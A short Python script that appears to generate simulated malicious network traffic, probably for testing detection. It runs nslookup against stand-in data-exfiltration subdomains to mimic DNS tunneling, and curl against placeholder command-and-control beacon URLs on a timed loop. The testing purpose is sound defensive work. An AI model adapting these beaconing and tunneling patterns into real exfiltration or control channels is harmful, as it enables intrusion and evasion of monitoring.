#!/usr/bin/env python3
import subprocess
import time
import random

def generate_dns_tunneling():
    domains = [
        "a1b2c3d4e5f6.malicious-domain.com",
        "x9y8z7w6v5u4.evil-site.net",
        "data123456789.exfil-domain.org"
    ]
    for domain in domains:
        subprocess.run(['nslookup', domain], capture_output=True)
        time.sleep(1)

def generate_http_beaconing():
    urls = [
        "http://suspicious-c2.example.com/beacon",
        "http://malware-command.example.net/check",
        "http://backdoor-control.example.org/status"
    ]
    for url in urls:
        subprocess.run(['curl', '-s', '--connect-timeout', '2', url], capture_output=True)
        time.sleep(5)

if __name__ == "__main__":
    print("Generating suspicious network patterns...")
    for i in range(3):
        generate_dns_tunneling()
        generate_http_beaconing()
        time.sleep(10)
